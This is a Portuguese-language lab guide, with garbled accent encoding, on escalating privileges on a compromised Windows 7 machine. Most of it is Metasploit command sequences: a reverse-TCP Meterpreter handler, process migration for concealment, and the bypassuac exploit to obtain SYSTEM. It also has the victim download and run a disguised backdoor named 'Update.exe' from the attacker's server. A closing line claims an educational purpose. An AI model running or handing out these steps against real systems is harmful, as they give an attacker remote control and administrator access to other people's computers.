# üöÄ Escalonamento de Privil√©gios no Windows

---

## üîç Introdu√ß√£o
P√≥s-explora√ß√£o refere-se a quaisquer a√ß√µes tomadas ap√≥s a abertura de uma sess√£o. Uma sess√£o √© um shell aberto de uma explora√ß√£o bem-sucedida ou ataque de for√ßa bruta, que por sua vez pode ser um shell padr√£o ou Meterpreter.

## üîë Import√¢ncia do Escalonamento de Privil√©gios
O escalonamento de privil√©gios √© uma t√©cnica comum usada para obter acesso elevado ao sistema, permitindo que um invasor v√° de um usu√°rio padr√£o para administrador ou at√© root.

## üìå Relembrando o Passo Anterior
Antes de iniciar o escalonamento de privil√©gios, foi realizado um ataque inicial que envolveu a cria√ß√£o e hospedagem de um backdoor execut√°vel em um servidor Apache, enganando o usu√°rio para baixar e executar o arquivo malicioso. Com isso, uma sess√£o Meterpreter foi estabelecida.

---

## üõ†Ô∏è Ferramentas Necess√°rias

- üêß Kali Linux
- üñ•Ô∏è Windows 7


##  üîπ Comandos no Kali Linux
1Ô∏è‚É£ Configurando o Kali Linux
```
sudo su  # Acessa o modo root
ip addr  # Obt√©m o IP do Kali
msfconsole  # Inicia o Metasploit Framework
use multi/handler  # Configura o handler para receber conex√µes
set payload windows/meterpreter/reverse_tcp  # Define o payload
set LHOST X.X.X.X  # Define o IP do Kali
set LPORT 4444  # Define a porta de conex√£o
run  # Executa o exploit
```

2Ô∏è‚É£ Ap√≥s o exploit ser bem-sucedido:
```
sysinfo  # Exibe informa√ß√µes do sistema da v√≠tima
getuid  # Mostra o usu√°rio atual
getsystem  # Tenta obter privil√©gios elevados
getpid  # Exibe o PID do processo atual
ps  # Lista os processos em execu√ß√£o
migrate XXXX  # Migra para outro processo para camuflagem (ex: explorer.exe)
getpid  # Confirma a migra√ß√£o do PID
shell  # Abre um shell interativo
whoami  # Verifica o usu√°rio atual
whoami /priv  # Lista os privil√©gios do usu√°rio
exit  # Sai do shell
background  # Retorna ao Metasploit sem encerrar a sess√£o
sessions  # Lista as sess√µes ativas
```

3Ô∏è‚É£ Escalonamento de Privil√©gios:
```
search UAC  # Busca por m√≥dulos de bypass de UAC
use exploit/windows/local/bypassuac  # Seleciona um exploit
show options  # Exibe as op√ß√µes dispon√≠veis
set payload windows/meterpreter/reverse_tcp  # Define o payload
show targets  # Mostra os alvos compat√≠veis
set target X  # Define o alvo correto (x32 ou x64)
set LHOST X.X.X.X  # Define o IP do Kali
set LPORT XXXX  # Define uma nova porta de conex√£o
set sessions X  # Escolhe a sess√£o ativa
run  # Executa o exploit
getuid  # Verifica se obteve privil√©gios elevados
getsystem  # Confirma se o acesso administrativo foi conseguido
shell  # Obt√©m um shell como administrador
whoami  # Confirma a identidade do usu√°rio
whoami /priv  # Lista os privil√©gios dispon√≠veis
```


## üîπ Comandos no Windows 7 (M√°quina Alvo)

**‚ö†Ô∏è Esse ataque faz parte da p√≥s-explora√ß√£o. A v√≠tima j√° deve ter sido comprometida no passo anterior, executando o arquivo malicioso gerado.**

1Ô∏è‚É£ Cria√ß√£o de um Arquivo de Flag (Opcional - Teste de Persist√™ncia)
```
echo "Backdoor ativo!" > "%USERPROFILE%\Desktop\flag.txt"
```

2Ô∏è‚É£ Identifica√ß√£o do IP da V√≠tima
```
ipconfig  # Exibe o IP da m√°quina alvo
```

3Ô∏è‚É£ Obten√ß√£o e Execu√ß√£o do Arquivo Malicioso

- Abrir o navegador da m√°quina Windows e acessar:
```
http://X.X.X.X/Update.exe
```
- Baixar e executar o arquivo malicioso.

---

## ‚ö†Ô∏è Aten√ß√£o
Este guia √© apenas para fins educativos e de seguran√ßa ofensiva em ambientes controlados. N√£o utilize para atividades maliciosas.

### üìä Resultados
Este ataque demonstra um m√©todo de p√≥s-explora√ß√£o que visa obter privil√©gios elevados ap√≥s comprometer uma m√°quina Windows 7. A t√©cnica pode ser aprimorada utilizando m√©todos de evas√£o de UAC, ofusca√ß√£o do payload e t√©cnicas avan√ßadas de persist√™ncia. Use com responsabilidade!